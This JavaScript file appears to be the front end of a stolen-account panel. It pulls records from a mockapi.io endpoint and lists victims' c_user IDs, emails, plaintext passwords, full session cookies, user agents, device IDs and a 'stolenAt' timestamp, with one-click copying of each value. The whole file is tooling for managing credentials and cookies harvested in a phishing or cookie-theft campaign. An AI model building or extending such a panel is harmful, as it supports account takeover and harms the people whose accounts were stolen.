const API = "https://65954b4d04335332df8268cd.mockapi.io/saved";

const tbody = document.querySelector("tbody");

function fillDataToTable() {
    fetch(API)
        .then((res) => res.json())
        .then((res) => {
            const html = res
                .map((user, index) => {
                    return `<tr>
                <td>${index + 1}</td>
                <td data-bs-coppy="${user.c_user}">${user.c_user}</td>
                <td data-bs-coppy="${user.email}">${user.email}</td>
                <td data-bs-coppy="${user.password}">${user.password}</td>

                <td  data-bs-coppy="${user.cookie}" class="short-view" style='color: ${
                        user.cookie && user.cookie != "" ? "" : "red !important"
                    }' title="${user.cookie}">
                    ${user.cookie && user.cookie != "" ? user.cookie.split(";")[0] : "unknown"}
                </td>

                <td data-bs-coppy="${user.userAgent}" class="short-view" title="${user.userAgent}">Coppy</td>
                <td data-bs-coppy="${user.device_id}">${user.device_id}</td>
                <td data-bs-coppy="${user.stolenAt}">${user.stolenAt}</td>
                <td>
                <button class="menu-more btn btn-secondary dropdown-toggle" style="padding: 6px 20px;border-radius: 12px; background: #ffffff11; color: white" data-bs-id="${
                    user.id
                }">More
                </button></td>
                </tr>`;
                })
                .join("");
            tbody.innerHTML = html;
        })
        .finally(() => {
            const tds = document.querySelectorAll("td[data-bs-coppy]");
            tds.forEach((td) => {
                td.onclick = () => {
                    const text = td.getAttribute("data-bs-coppy");
                    if (text && text != "" && text != "unknown") {
                        navigator.clipboard.writeText(text);
                        Swal.fire({
                            title: "Success!",
                            text: "Coppied to clipboard!",
                            icon: "success",
                            confirmButtonText: "Close",
                        });
                    } else {
                        Swal.fire({
                            title: "Error!",
                            text: "Can not coppy the empty value!",
                            icon: "error",
                            confirmButtonText: "Okay",
                        });
                    }
                };
            });
        });
}

(() => fillDataToTable())();
